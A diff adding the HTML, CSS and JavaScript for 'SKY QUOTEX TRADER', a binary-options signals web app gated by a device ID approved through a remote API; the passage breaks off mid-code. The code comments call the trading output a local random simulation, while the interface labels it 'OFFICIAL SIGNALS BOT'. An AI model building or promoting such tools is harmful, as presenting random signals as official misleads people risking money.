@@ -1,0 +1,2319 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0,viewport-fit=cover">
+<meta name="theme-color" content="#050816">
+<title>SKY QUOTEX TRADER</title>
+
+<link rel="icon" href="https://sky-qx-pro-bot.vercel.app/slogo.png">
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;600;700;800;900&family=Rajdhani:wght@500;600;700&display=swap" rel="stylesheet">
+
+<style>
+:root{
+    --bg:#030612;
+    --bg2:#070b18;
+    --glass:rgba(10,17,35,.70);
+    --glass2:rgba(15,23,42,.82);
+    --line:rgba(125,211,252,.14);
+    --cyan:#22d3ee;
+    --blue:#38bdf8;
+    --violet:#8b5cf6;
+    --pink:#ec4899;
+    --green:#22c55e;
+    --red:#ef4444;
+    --white:#f8fafc;
+    --muted:#8492a8;
+    --shadow:0 25px 80px rgba(0,0,0,.55);
+}
+
+*{
+    box-sizing:border-box;
+    margin:0;
+    padding:0;
+    -webkit-tap-highlight-color:transparent;
+}
+
+html,body{
+    min-height:100%;
+}
+
+body{
+    min-height:100vh;
+    overflow-x:hidden;
+    color:var(--white);
+    font-family:Rajdhani,sans-serif;
+    background:
+        radial-gradient(circle at 10% 10%,rgba(34,211,238,.12),transparent 32%),
+        radial-gradient(circle at 90% 15%,rgba(139,92,246,.14),transparent 34%),
+        radial-gradient(circle at 50% 100%,rgba(236,72,153,.09),transparent 40%),
+        linear-gradient(145deg,#02040b,#07101e 55%,#030611);
+}
+
+body:before{
+    content:"";
+    position:fixed;
+    inset:0;
+    pointer-events:none;
+    opacity:.20;
+    background-image:
+        linear-gradient(rgba(56,189,248,.045) 1px,transparent 1px),
+        linear-gradient(90deg,rgba(56,189,248,.045) 1px,transparent 1px);
+    background-size:42px 42px;
+    mask-image:linear-gradient(to bottom,black,transparent 90%);
+}
+
+body:after{
+    content:"";
+    position:fixed;
+    width:280px;
+    height:280px;
+    left:-100px;
+    top:35%;
+    border-radius:50%;
+    background:rgba(34,211,238,.08);
+    filter:blur(80px);
+    pointer-events:none;
+    animation:floatGlow 7s ease-in-out infinite;
+}
+
+@keyframes floatGlow{
+    0%,100%{transform:translate(0,0)}
+    50%{transform:translate(120px,-50px)}
+}
+
+button{
+    font-family:inherit;
+}
+
+/* LOADING */
+
+#loadScreen{
+    position:fixed;
+    inset:0;
+    z-index:99999;
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    justify-content:center;
+    gap:17px;
+    background:
+        radial-gradient(circle at 50% 30%,rgba(34,211,238,.10),transparent 35%),
+        #02040b;
+}
+
+.logo-pulse{
+    width:105px;
+    height:105px;
+    border-radius:50%;
+    object-fit:cover;
+    border:1px solid rgba(34,211,238,.55);
+    box-shadow:
+        0 0 30px rgba(34,211,238,.22),
+        0 0 80px rgba(139,92,246,.15);
+    animation:logoZoom 1.8s ease-in-out infinite;
+}
+
+@keyframes logoZoom{
+    0%,100%{
+        transform:scale(.94);
+        box-shadow:0 0 25px rgba(34,211,238,.22),0 0 60px rgba(139,92,246,.12);
+    }
+    50%{
+        transform:scale(1.07);
+        box-shadow:0 0 45px rgba(34,211,238,.5),0 0 100px rgba(139,92,246,.25);
+    }
+}
+
+.brand{
+    font-family:Orbitron,sans-serif;
+    font-weight:900;
+    font-size:18px;
+    letter-spacing:3px;
+    color:#fff;
+    text-shadow:0 0 18px rgba(34,211,238,.4);
+    text-align:center;
+}
+
+.brand span{
+    color:var(--cyan);
+}
+
+.load-track{
+    width:230px;
+    height:5px;
+    border-radius:20px;
+    background:rgba(255,255,255,.05);
+    overflow:hidden;
+    border:1px solid rgba(255,255,255,.06);
+}
+
+.load-progress{
+    width:0;
+    height:100%;
+    border-radius:20px;
+    background:linear-gradient(90deg,var(--violet),var(--cyan));
+    box-shadow:0 0 18px var(--cyan);
+    transition:.35s;
+}
+
+.load-status{
+    color:var(--muted);
+    font-size:12px;
+    letter-spacing:1.5px;
+}
+
+/* LOCK */
+
+#lockScreen{
+    position:fixed;
+    inset:0;
+    z-index:9998;
+    display:none;
+    align-items:center;
+    justify-content:center;
+    padding:22px;
+    overflow:auto;
+    background:
+        radial-gradient(circle at 50% 15%,rgba(34,211,238,.10),transparent 32%),
+        radial-gradient(circle at 90% 80%,rgba(139,92,246,.10),transparent 35%),
+        #02040b;
+}
+
+.lock-card{
+    width:100%;
+    max-width:390px;
+    padding:28px 21px;
+    text-align:center;
+    border:1px solid rgba(125,211,252,.18);
+    border-radius:30px;
+    background:linear-gradient(145deg,rgba(15,23,42,.82),rgba(4,9,20,.72));
+    box-shadow:var(--shadow),0 0 80px rgba(34,211,238,.06);
+    backdrop-filter:blur(24px);
+    -webkit-backdrop-filter:blur(24px);
+}
+
+.lock-logo{
+    width:110px;
+    height:110px;
+    border-radius:50%;
+    object-fit:cover;
+    border:2px solid rgba(34,211,238,.55);
+    margin-bottom:18px;
+    animation:logoZoom 1.8s infinite;
+}
+
+.lock-brand{
+    font-family:Orbitron,sans-serif;
+    font-size:18px;
+    font-weight:900;
+    letter-spacing:2px;
+}
+
+.lock-brand span{
+    color:var(--cyan);
+}
+
+.lock-state{
+    margin-top:10px;
+    display:inline-flex;
+    align-items:center;
+    gap:7px;
+    padding:7px 12px;
+    border-radius:30px;
+    color:#fbbf24;
+    background:rgba(245,158,11,.08);
+    border:1px solid rgba(245,158,11,.18);
+    font-size:11px;
+    letter-spacing:1.5px;
+    font-weight:700;
+}
+
+.lock-dot{
+    width:7px;
+    height:7px;
+    border-radius:50%;
+    background:#f59e0b;
+    box-shadow:0 0 10px #f59e0b;
+    animation:blink 1s infinite;
+}
+
+@keyframes blink{
+    50%{opacity:.3}
+}
+
+.lock-desc{
+    margin:14px 0 20px;
+    color:var(--muted);
+    font-size:13px;
+    line-height:1.5;
+}
+
+.id-card{
+    padding:18px;
+    border-radius:19px;
+    background:rgba(2,6,23,.60);
+    border:1px solid rgba(34,211,238,.15);
+}
+
+.id-label{
+    color:#64748b;
+    font-size:10px;
+    letter-spacing:2px;
+    margin-bottom:9px;
+}
+
+.device-id{
+    font-family:Orbitron,sans-serif;
+    font-size:14px;
+    color:var(--cyan);
+    letter-spacing:2px;
+    word-break:break-all;
+    text-shadow:0 0 15px rgba(34,211,238,.25);
+    user-select:all;
+}
+
+.copy-btn{
+    width:100%;
+    margin-top:14px;
+    border:0;
+    border-radius:13px;
+    padding:13px;
+    color:#020617;
+    font-weight:800;
+    letter-spacing:1px;
+    cursor:pointer;
+    background:linear-gradient(100deg,var(--violet),var(--cyan));
+    box-shadow:0 8px 30px rgba(34,211,238,.16);
+    transition:.2s;
+}
+
+.copy-btn:active{
+    transform:scale(.97);
+}
+
+.verify-status{
+    margin-top:15px;
+    padding:13px;
+    border-radius:14px;
+    background:rgba(34,211,238,.035);
+    border:1px solid rgba(34,211,238,.10);
+    color:var(--muted);
+    font-size:12px;
+}
+
+.spinner{
+    display:inline-block;
+    width:14px;
+    height:14px;
+    margin-right:7px;
+    vertical-align:-2px;
+    border:2px solid rgba(34,211,238,.18);
+    border-top-color:var(--cyan);
+    border-radius:50%;
+    animation:spin .8s linear infinite;
+}
+
+@keyframes spin{
+    to{transform:rotate(360deg)}
+}
+
+/* APP */
+
+#app{
+    display:none;
+    width:100%;
+    max-width:520px;
+    min-height:100vh;
+    margin:auto;
+    padding-bottom:50px;
+}
+
+.header{
+    position:sticky;
+    top:0;
+    z-index:500;
+    padding:15px 17px;
+    display:flex;
+    align-items:center;
+    gap:12px;
+    background:rgba(3,6,18,.72);
+    border-bottom:1px solid rgba(125,211,252,.10);
+    backdrop-filter:blur(24px);
+    -webkit-backdrop-filter:blur(24px);
+}
+
+.header-logo{
+    width:48px;
+    height:48px;
+    border-radius:15px;
+    object-fit:cover;
+    border:1px solid rgba(34,211,238,.35);
+    box-shadow:0 0 22px rgba(34,211,238,.16);
+}
+
+.header-info{
+    flex:1;
+}
+
+.header-title{
+    font-family:Orbitron,sans-serif;
+    font-size:14px;
+    font-weight:900;
+    letter-spacing:1.3px;
+}
+
+.header-title span{
+    color:var(--cyan);
+}
+
+.header-sub{
+    margin-top:3px;
+    color:var(--muted);
+    font-size:10px;
+    letter-spacing:1px;
+}
+
+.online{
+    display:flex;
+    align-items:center;
+    gap:5px;
+    color:#4ade80;
+    font-size:10px;
+    font-weight:700;
+}
+
+.online-dot{
+    width:6px;
+    height:6px;
+    border-radius:50%;
+    background:#22c55e;
+    box-shadow:0 0 9px #22c55e;
+}
+
+/* HERO */
+
+.hero{
+    padding:25px 17px 15px;
+    text-align:center;
+}
+
+.hero-logo{
+    width:88px;
+    height:88px;
+    border-radius:50%;
+    object-fit:cover;
+    border:1px solid rgba(34,211,238,.35);
+    animation:logoZoom 2s ease-in-out infinite;
+}
+
+.hero h1{
+    margin-top:13px;
+    font-family:Orbitron,sans-serif;
+    font-size:20px;
+    letter-spacing:2px;
+}
+
+.hero h1 span{
+    color:var(--cyan);
+}
+
+.demo-badge{
+    display:inline-flex;
+    margin-top:9px;
+    padding:5px 11px;
+    border-radius:30px;
+    color:#a5f3fc;
+    background:rgba(34,211,238,.06);
+    border:1px solid rgba(34,211,238,.15);
+    font-size:9px;
+    font-weight:800;
+    letter-spacing:1.5px;
+}
+
+/* SELECTORS */
+
+.controls{
+    padding:5px 16px 13px;
+}
+
+.select-row{
+    display:grid;
+    grid-template-columns:1fr 1fr;
+    gap:10px;
+}
+
+.custom-select{
+    position:relative;
+}
+
+.select-btn{
+    width:100%;
+    min-height:54px;
+    padding:13px 14px;
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    gap:7px;
+    cursor:pointer;
+    color:#e2e8f0;
+    background:linear-gradient(145deg,rgba(15,23,42,.78),rgba(7,13,27,.78));
+    border:1px solid rgba(125,211,252,.13);
+    border-radius:16px;
+    box-shadow:0 10px 30px rgba(0,0,0,.25);
+    backdrop-filter:blur(16px);
+    transition:.2s;
+}
+
+.select-btn.open{
+    border-color:rgba(34,211,238,.55);
+    box-shadow:0 0 25px rgba(34,211,238,.10);
+}
+
+.select-btn .label{
+    min-width:0;
+    overflow:hidden;
+    white-space:nowrap;
+    text-overflow:ellipsis;
+    font-size:13px;
+    font-weight:700;
+}
+
+.select-btn .arr{
+    flex-shrink:0;
+    color:var(--cyan);
+    transition:.2s;
+}
+
+.select-btn.open .arr{
+    transform:rotate(180deg);
+}
+
+.select-drop{
+    display:none;
+    position:absolute;
+    left:0;
+    top:calc(100% + 7px);
+    width:100%;
+    max-height:245px;
+    overflow-y:auto;
+    z-index:1000;
+    padding:5px;
+    border-radius:17px;
+    background:rgba(5,10,22,.97);
+    border:1px solid rgba(34,211,238,.30);
+    box-shadow:0 25px 70px rgba(0,0,0,.72);
+    backdrop-filter:blur(22px);
+}
+
+.select-drop.show{
+    display:block;
+    animation:dropIn .18s ease;
+}
+
+@keyframes dropIn{
+    from{opacity:0;transform:translateY(-5px)}
+    to{opacity:1;transform:translateY(0)}
+}
+
+.select-drop::-webkit-scrollbar{
+    width:4px;
+}
+
+.select-drop::-webkit-scrollbar-thumb{
+    background:linear-gradient(var(--violet),var(--cyan));
+    border-radius:20px;
+}
+
+.drop-item{
+    padding:12px 12px;
+    border-radius:11px;
+    color:#cbd5e1;
+    font-size:12px;
+    font-weight:700;
+    cursor:pointer;
+    transition:.15s;
+}
+
+.drop-item:hover,
+.drop-item.active{
+    color:#fff;
+    background:linear-gradient(90deg,rgba(139,92,246,.14),rgba(34,211,238,.12));
+}
+
+/* CHART */
+
+.chart-card{
+    margin:0 16px 13px;
+    padding:13px;
+    border-radius:23px;
+    background:linear-gradient(145deg,rgba(10,18,36,.86),rgba(3,8,19,.80));
+    border:1px solid rgba(125,211,252,.12);
+    box-shadow:var(--shadow);
+    overflow:hidden;
+}
+
+.chart-head{
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    margin-bottom:10px;
+}
+
+.market-label{
+    display:flex;
+    align-items:center;
+    gap:7px;
+    font-family:Orbitron,sans-serif;
+    font-size:9px;
+    letter-spacing:1px;
+    color:#94a3b8;
+}
+
+.market-dot{
+    width:7px;
+    height:7px;
+    border-radius:50%;
+    background:#22c55e;
+    box-shadow:0 0 9px #22c55e;
+    animation:blink 1s infinite;
+}
+
+.price-label{
+    color:var(--cyan);
+    font-family:Orbitron,sans-serif;
+    font-size:10px;
+}
+
+.chart-wrap{
+    position:relative;
+    height:270px;
+    border-radius:16px;
+    overflow:hidden;
+    background:
+        linear-gradient(rgba(34,211,238,.035) 1px,transparent 1px),
+        linear-gradient(90deg,rgba(34,211,238,.035) 1px,transparent 1px),
+        #030711;
+    background-size:35px 35px;
+    border:1px solid rgba(125,211,252,.07);
+}
+
+#marketChart{
+    width:100%;
+    height:100%;
+    display:block;
+}
+
+.chart-watermark{
+    position:absolute;
+    left:12px;
+    bottom:9px;
+    color:rgba(148,163,184,.25);
+    font-family:Orbitron,sans-serif;
+    font-size:8px;
+    letter-spacing:1.5px;
+    pointer-events:none;
+}
+
+.analysis-overlay{
+    position:absolute;
+    inset:0;
+    display:none;
+    align-items:center;
+    justify-content:center;
+    flex-direction:column;
+    gap:12px;
+    background:rgba(2,6,18,.72);
+    backdrop-filter:blur(4px);
+}
+
+.analysis-overlay.show{
+    display:flex;
+}
+
+.analysis-number{
+    font-family:Orbitron,sans-serif;
+    font-size:55px;
+    font-weight:900;
+    color:var(--cyan);
+    text-shadow:0 0 30px rgba(34,211,238,.5);
+}
+
+.analysis-text{
+    color:#94a3b8;
+    font-size:11px;
+    letter-spacing:2px;
+}
+
+/* RESULT */
+
+.result-card{
+    display:none;
+    margin:0 16px 13px;
+    padding:20px;
+    text-align:center;
+    border-radius:23px;
+    background:linear-gradient(145deg,rgba(10,18,36,.92),rgba(3,8,19,.88));
+    border:1px solid rgba(125,211,252,.13);
+    box-shadow:var(--shadow);
+}
+
+.result-card.show{
+    display:block;
+    animation:resultIn .45s ease;
+}
+
+@keyframes resultIn{
+    from{opacity:0;transform:scale(.94) translateY(12px)}
+    to{opacity:1;transform:scale(1) translateY(0)}
+}
+
+.result-label{
+    color:#64748b;
+    font-family:Orbitron,sans-serif;
+    font-size:9px;
+    letter-spacing:2px;
+}
+
+.result-pair{
+    margin-top:8px;
+    font-size:14px;
+    font-weight:700;
+}
+
+.result-direction{
+    margin:13px auto;
+    font-family:Orbitron,sans-serif;
+    font-size:28px;
+    font-weight:900;
+}
+
+.result-direction.up{
+    color:var(--green);
+    text-shadow:0 0 25px rgba(34,197,94,.45);
+}
+
+.result-direction.down{
+    color:var(--red);
+    text-shadow:0 0 25px rgba(239,68,68,.45);
+}
+
+/* RESULT CANDLE */
+
+.result-candle-box{
+    height:120px;
+    position:relative;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    margin:3px auto 8px;
+}
+
+.result-wick{
+    position:absolute;
+    width:3px;
+    height:75px;
+    border-radius:4px;
+}
+
+.result-body{
+    position:absolute;
+    width:28px;
+    height:47px;
+    border-radius:4px;
+    box-shadow:0 0 20px currentColor;
+}
+
+.result-candle-box.up{
+    color:var(--green);
+}
+
+.result-candle-box.down{
+    color:var(--red);
+}
+
+.result-candle-box.up .result-wick,
+.result-candle-box.up .result-body{
+    background:var(--green);
+}
+
+.result-candle-box.down .result-wick,
+.result-candle-box.down .result-body{
+    background:var(--red);
+}
+
+.result-time{
+    color:#94a3b8;
+    font-size:11px;
+}
+
+.trade-count{
+    margin-top:13px;
+    padding:13px;
+    border-radius:14px;
+    background:rgba(255,255,255,.025);
+    border:1px solid rgba(255,255,255,.06);
+}
+
+.trade-count-label{
+    color:#64748b;
+    font-size:9px;
+    letter-spacing:1.5px;
+}
+
+.trade-count-number{
+    margin-top:4px;
+    font-family:Orbitron,sans-serif;
+    font-size:25px;
+    font-weight:900;
+    color:var(--cyan);
+}
+
+/* BUTTON */
+
+.signal-btn{
+    width:calc(100% - 32px);
+    margin:0 16px 16px;
+    padding:17px;
+    border:0;
+    border-radius:17px;
+    cursor:pointer;
+    color:#020617;
+    font-family:Orbitron,sans-serif;
+    font-size:13px;
+    font-weight:900;
+    letter-spacing:1.5px;
+    background:linear-gradient(105deg,var(--violet),var(--cyan));
+    box-shadow:0 12px 35px rgba(34,211,238,.18);
+    transition:.2s;
+}
+
+.signal-btn:active{
+    transform:scale(.98);
+}
+
+.signal-btn:disabled{
+    opacity:.42;
+    cursor:not-allowed;
+}
+
+/* INFO */
+
+.info-card{
+    margin:0 16px;
+    padding:14px;
+    display:flex;
+    align-items:center;
+    gap:10px;
+    border-radius:16px;
+    background:rgba(15,23,42,.48);
+    border:1px solid rgba(125,211,252,.08);
+}
+
+.info-icon{
+    width:35px;
+    height:35px;
+    display:grid;
+    place-items:center;
+    border-radius:10px;
+    background:rgba(34,211,238,.07);
+    color:var(--cyan);
+    font-size:15px;
+}
+
+.info-text{
+    color:#64748b;
+    font-size:10px;
+    line-height:1.5;
+}
+
+.info-text b{
+    color:#94a3b8;
+}
+
+/* TOAST */
+
+#toast{
+    position:fixed;
+    left:50%;
+    bottom:25px;
+    z-index:100000;
+    transform:translate(-50%,20px);
+    opacity:0;
+    pointer-events:none;
+    padding:12px 19px;
+    border-radius:30px;
+    background:rgba(15,23,42,.95);
+    border:1px solid rgba(34,211,238,.25);
+    color:#e2e8f0;
+    font-family:Rajdhani,sans-serif;
+    font-size:12px;
+    font-weight:700;
+    box-shadow:0 15px 40px rgba(0,0,0,.5);
+    transition:.3s;
+    white-space:nowrap;
+}
+
+#toast.show{
+    opacity:1;
+    transform:translate(-50%,0);
+}
+
+@media(max-width:370px){
+    .select-btn .label{font-size:11px}
+    .hero h1{font-size:17px}
+}
+</style>
+</head>
+
+<body>
+
+<!-- LOADING -->
+<div id="loadScreen">
+    <img src="https://sky-qx-pro-bot.vercel.app/slogo.png" class="logo-pulse" alt="SKY">
+    <div class="brand">SKY <span>QUOTEX</span> TRADER</div>
+
+    <div class="load-track">
+        <div class="load-progress" id="loadProgress"></div>
+    </div>
+
+    <div class="load-status" id="loadStatus">
+        INITIALIZING SYSTEM...
+    </div>
+</div>
+
+<!-- LOCK -->
+<div id="lockScreen">
+    <div class="lock-card">
+
+        <img src="https://sky-qx-pro-bot.vercel.app/slogo.png" class="lock-logo" alt="SKY">
+
+        <div class="lock-brand">
+            SKY <span>QUOTEX</span> TRADER
+        </div>
+
+        <div class="lock-state">
+            <span class="lock-dot"></span>
+            ACCESS LOCKED
+        </div>
+
+        <div class="lock-desc">
+            Your unique device ID is being verified in real time.
+            Keep this screen open while approval is pending.
+        </div>
+
+        <div class="id-card">
+            <div class="id-label">20 DIGIT DEVICE ID</div>
+
+            <div class="device-id" id="deviceId">
+                --------------------
+            </div>
+
+            <button class="copy-btn" id="copyIdBtn">
+                COPY DEVICE ID
+            </button>
+
+            <div id="copyStatus"></div>
+        </div>
+
+        <div class="verify-status">
+            <span class="spinner"></span>
+            <span id="verifyText">Waiting for approval...</span>
+        </div>
+
+    </div>
+</div>
+
+<!-- MAIN APP -->
+<main id="app">
+
+    <header class="header">
+
+        <img src="https://sky-qx-pro-bot.vercel.app/slogo.png" class="header-logo" alt="SKY">
+
+        <div class="header-info">
+            <div class="header-title">
+                SKY <span>QUOTEX</span> TRADER
+            </div>
+
+            <div class="header-sub">
+                OTC MARKET BOT
+            </div>
+        </div>
+
+        <div class="online">
+            <span class="online-dot"></span>
+            VERIFIED
+        </div>
+
+    </header>
+
+    <section class="hero">
+
+        <img src="https://sky-qx-pro-bot.vercel.app/slogo.png" class="hero-logo" alt="SKY">
+
+        <h1>
+            SKY <span>QUOTEX</span> TRADER
+        </h1>
+
+        <div class="demo-badge">
+            OFFICIAL SIGNALS BOT</div>
+
+    </section>
+
+    <!-- SELECTORS -->
+    <section class="controls">
+
+        <div class="select-row">
+
+            <div class="custom-select" id="pairSelect">
+
+                <div class="select-btn" id="pairBtn">
+                    <span class="label" id="pairLabel">
+                        Select Pair
+                    </span>
+                    <span class="arr">▼</span>
+                </div>
+
+                <div class="select-drop" id="pairDrop"></div>
+
+            </div>
+
+            <div class="custom-select" id="timeSelect">
+
+                <div class="select-btn" id="timeBtn">
+                    <span class="label" id="timeLabel">
+                        Select Time
+                    </span>
+                    <span class="arr">▼</span>
+                </div>
+
+                <div class="select-drop" id="timeDrop"></div>
+
+            </div>
+
+        </div>
+
+    </section>
+
+    <!-- CHART -->
+    <section class="chart-card" id="chartCard">
+
+        <div class="chart-head">
+
+            <div class="market-label">
+                <span class="market-dot"></span>
+                SYNTHETIC LIVE MARKET
+            </div>
+
+            <div class="price-label" id="priceLabel">
+                ----
+            </div>
+
+        </div>
+
+        <div class="chart-wrap">
+
+            <canvas id="marketChart"></canvas>
+
+            <div class="chart-watermark">
+                SKY QUOTEX MARKET
+            </div>
+
+            <div class="analysis-overlay" id="analysisOverlay">
+
+                <div class="analysis-number" id="analysisNumber">
+                    5
+                </div>
+
+                <div class="analysis-text">
+                    ANALYZING MARKET...
+                </div>
+
+            </div>
+
+        </div>
+
+    </section>
+
+    <!-- RESULT -->
+    <section class="result-card" id="resultCard">
+
+        <div class="result-label">
+            OFFICIAL SIGNAL BOT
+        </div>
+
+        <div class="result-pair" id="resultPair">
+            ---
+        </div>
+
+        <div class="result-direction" id="resultDirection">
+            UP
+        </div>
+
+        <div class="result-candle-box" id="resultCandle">
+
+            <div class="result-wick"></div>
+            <div class="result-body"></div>
+
+        </div>
+
+        <div class="result-time" id="resultTime">
+            OFFICIAL SIGNALS BOT</div>
+
+        <div class="trade-count">
+
+            <div class="trade-count-label">
+             COUNTDOWN
+            </div>
+
+            <div class="trade-count-number" id="tradeCountdown">
+                --:--
+            </div>
+
+        </div>
+
+    </section>
+
+    <!-- GET SIGNAL -->
+    <button class="signal-btn" id="signalBtn">
+        GET SIGNAL
+    </button>
+
+    <div class="info-card">
+
+        <div class="info-icon">◈</div>
+
+        <div class="info-text">
+            <b>🚨Disclaimer<i>:</i></b> This Bot doesn't guarantee your profit Earning. It's meant for Education purpose only.Trading in any form involves Financial Risk. I'm not Responsible for Financial Outcomes 18+ 📊</div>
+
+    </div>
+
+</main>
+
+<div id="toast"></div>
+
+<script>
+/* =========================================================
+   SKY QUOTEX TRADER
+   ACCESS VERIFICATION + LOCAL RANDOM MARKET SIMULATION
+   ========================================================= */
+
+const VERIFY_API =
+    "https://sky-qx-pro-bot.vercel.app/api/s?id=";
+
+const DEVICE_KEY =
+    "sky_qx_device_id";
+
+/* EXACT PAIRS REQUESTED */
+
+const PAIRS = [
+  "USD/PKR(OTC)", "USD/ARS(OTC)", "USD/CAD(OTC)", "USD/BRL(OTC)", "USD/DZD(OTC)", "USD/NZD(OTC)",
+  "NZD/CAD(OTC)", "USD/BDT(OTC)", "USD/MXN(OTC)", "USD/TRY(OTC)", "NZD/JPY(OTC)",
+  "Solana(OTC)", "Celestia(OTC)", "TRON(OTC)", "Trump(OTC)", "Gold(OTC)", "Silver(OTC)",
+  "UScrude(OTC)", "UKBrent(OTC)", "Johnson & Johnson(OTC)", "Intel(OTC)",
+  "FACEBOOK INC(OTC)", "Pfizer Inc(OTC)", "Microsoft(OTC)", "American Express(OTC)",
+  "Boeing Company(OTC)", "McDonald's(OTC)", "Pepe(OTC)"
+];
+
+const TIMES = [
+  { l: "5 Sec", v: 5, code: "5S" },
+  { l: "10 Sec", v: 10, code: "10S" },
+  { l: "15 Sec", v: 15, code: "15S" },
+  { l: "30 Sec", v: 30, code: "30S" },
+  { l: "1 Min", v: 60, code: "1M" },
+  { l: "2 Min", v: 120, code: "2M" },
+  { l: "5 Min", v: 300, code: "5M" },
+  { l: "10 Min", v: 600, code: "10M" }
+];
+
+/* =========================================================
+   DEVICE ID
+   ========================================================= */
+
+function createDeviceID(){
+
+    let id = localStorage.getItem(DEVICE_KEY);
+
+    if(
+        !id ||
+        !/^\d{20}$/.test(id)
+    ){
+
+        id = "";
+
+        for(let i = 0; i < 20; i++){
+            id += Math.floor(Math.random() * 10);
+        }
+
+        localStorage.setItem(
+            DEVICE_KEY,
+            id
+        );
+    }
+
+    return id;
+}
+
+const DEVICE_ID = createDeviceID();
+
+document.getElementById("deviceId").textContent =
+    DEVICE_ID;
+
+
+/* =========================================================
+   APP STATE
+   ========================================================= */
+
+let approved = false;
+let verifying = false;
+
+let selectedPair = "";
+let selectedTime = null;
+
+let approvalTimer = null;
+let runtimeTimer = null;
+
+let analysisRunning = false;
+let tradeRunning = false;
+
+let tradeTimer = null;
+
+
+/* =========================================================
+   UTILITY
+   ========================================================= */
+
+function sleep(ms){
+    return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+function toast(message){
+
+    const box =
+        document.getElementById("toast");
+
+    box.textContent = message;
+    box.classList.add("show");
+
+    clearTimeout(
+        window.toastTimer
+    );
+
+    window.toastTimer =
+        setTimeout(() => {
+            box.classList.remove("show");
+        },3000);
+}
+
+
+/* =========================================================
+   COPY ID
+   ========================================================= */
+
+document.getElementById("copyIdBtn")
+.addEventListener("click", async () => {
+
+    try{
+
+        await navigator.clipboard.writeText(
+            DEVICE_ID
+        );
+
+    }catch{
+
+        const area =
+            document.createElement("textarea");
+
+        area.value = DEVICE_ID;
+
+        document.body.appendChild(area);
+
+        area.select();
+
+        document.execCommand("copy");
+
+        area.remove();
+    }
+
+    const status =
+        document.getElementById("copyStatus");
+
+    status.textContent =
+        "✓ Device ID copied";
+
+    status.style.cssText =
+        "margin-top:8px;color:#4ade80;font-size:11px;font-weight:700;";
+
+    setTimeout(() => {
+        status.textContent = "";
+    },2500);
+});
+
+
+/* =========================================================
+   VERIFY API
+   EXACT RESPONSE: S
+   ========================================================= */
+
+async function checkApproval(){
+
+    if(verifying)
+        return false;
+
+    verifying = true;
+
+    try{
+
+        const response =
+            await fetch(
+                VERIFY_API +
+                encodeURIComponent(DEVICE_ID) +
+                "&t=" +
+                Date.now(),
+                {
+                    method:"GET",
+                    cache:"no-store"
+                }
+            );
+
+        if(!response.ok)
+            return false;
+
+        const text =
+            (await response.text()).trim();
+
+        return text === "S";
+
+    }catch(error){
+
+        return false;
+
+    }finally{
+
+        verifying = false;
+    }
+}
+
+
+/* =========================================================
+   LOADING
+   ========================================================= */
+
+async function boot(){
+
+    const bar =
+        document.getElementById("loadProgress");
+
+    const status =
+        document.getElementById("loadStatus");
+
+    const steps = [
+        [18,"INITIALIZING CORE..."],
+        [38,"CREATING DEVICE KEY..."],
+        [62,"CONNECTING SECURITY NODE..."],
+        [82,"VERIFYING ACCESS..."],
+        [100,"SYSTEM READY"]
+    ];
+
+    for(const [percent,text] of steps){
+
+        bar.style.width =
+            percent + "%";
+
+        status.textContent =
+            text;
+
+        await sleep(250);
+    }
+
+    const ok =
+        await checkApproval();
+
+    if(ok){
+
+        unlockApp();
+
+    }else{
+
+        lockApp();
+    }
+}
+
+
+/* =========================================================
+   LOCK / UNLOCK
+   ========================================================= */
+
+function lockApp(){
+
+    approved = false;
+
+    document.getElementById(
+        "loadScreen"
+    ).style.display = "none";
+
+    document.getElementById(
+        "app"
+    ).style.display = "none";
+
+    document.getElementById(
+        "lockScreen"
+    ).style.display = "flex";
+
+    document.getElementById(
+        "verifyText"
+    ).textContent =
+        "Waiting for admin approval...";
+
+    stopSimulation();
+
+    startApprovalPolling();
+}
+
+
+function unlockApp(){
+
+    approved = true;
+
+    clearInterval(approvalTimer);
+    approvalTimer = null;
+
+    document.getElementById(
+        "loadScreen"
+    ).style.display = "none";
+
+    document.getElementById(
+        "lockScreen"
+    ).style.display = "none";
+
+    document.getElementById(
+        "app"
+    ).style.display = "block";
+
+    initSelectors();
+    initChart();
+
+    startRuntimeVerification();
+}
+
+
+/* =========================================================
+   APPROVAL POLLING
+   ========================================================= */
+
+function startApprovalPolling(){
+
+    clearInterval(approvalTimer);
+
+    approvalTimer =
+        setInterval(async () => {
+
+            const ok =
+                await checkApproval();
+
+            if(ok){
+
+                unlockApp();
+            }
+
+        },4000);
+}
+
+
+/* =========================================================
+   REAL-TIME ACCESS MONITOR
+   NO PAGE RELOAD
+   ========================================================= */
+
+function startRuntimeVerification(){
+
+    clearInterval(runtimeTimer);
+
+    runtimeTimer =
+        setInterval(async () => {
+
+            const ok =
+                await checkApproval();
+
+            if(!ok){
+
+                lockApp();
+            }
+
+        },7000);
+}
+
+
+/* =========================================================
+   STOP SIMULATION
+   ========================================================= */
+
+function stopSimulation(){
+
+    analysisRunning = false;
+    tradeRunning = false;
+
+    clearInterval(tradeTimer);
+    tradeTimer = null;
+
+    document.getElementById(
+        "analysisOverlay"
+    ).classList.remove("show");
+
+    document.getElementById(
+        "resultCard"
+    ).classList.remove("show");
+
+    document.getElementById(
+        "chartCard"
+    ).style.display = "block";
+
+    const button =
+        document.getElementById("signalBtn");
+
+    button.disabled = false;
+    button.textContent =
+        "GET DEMO SIGNAL";
+}
+
+
+/* =========================================================
+   SELECTORS
+   ========================================================= */
+
+function buildSelector(){
+
+    const pairDrop =
+        document.getElementById("pairDrop");
+
+    const timeDrop =
+        document.getElementById("timeDrop");
+
+    pairDrop.innerHTML = "";
+    timeDrop.innerHTML = "";
+
+    PAIRS.forEach(pair => {
+
+        const item =
+            document.createElement("div");
+
+        item.className =
+            "drop-item";
+
+        item.textContent =
+            pair;
+
+        item.onclick = () =>
+            selectPair(pair);
+
+        pairDrop.appendChild(item);
+    });
+
+    TIMES.forEach(time => {
+
+        const item =
+            document.createElement("div");
+
+        item.className =
+            "drop-item";
+
+        item.textContent =
+            time.l;
+
+        item.onclick = () =>
+            selectTime(time);
+
+        timeDrop.appendChild(item);
+    });
+}
+
+
+function closeDrops(){
+
+    document
+        .querySelectorAll(".select-drop")
+        .forEach(drop =>
+            drop.classList.remove("show")
+        );
+
+    document
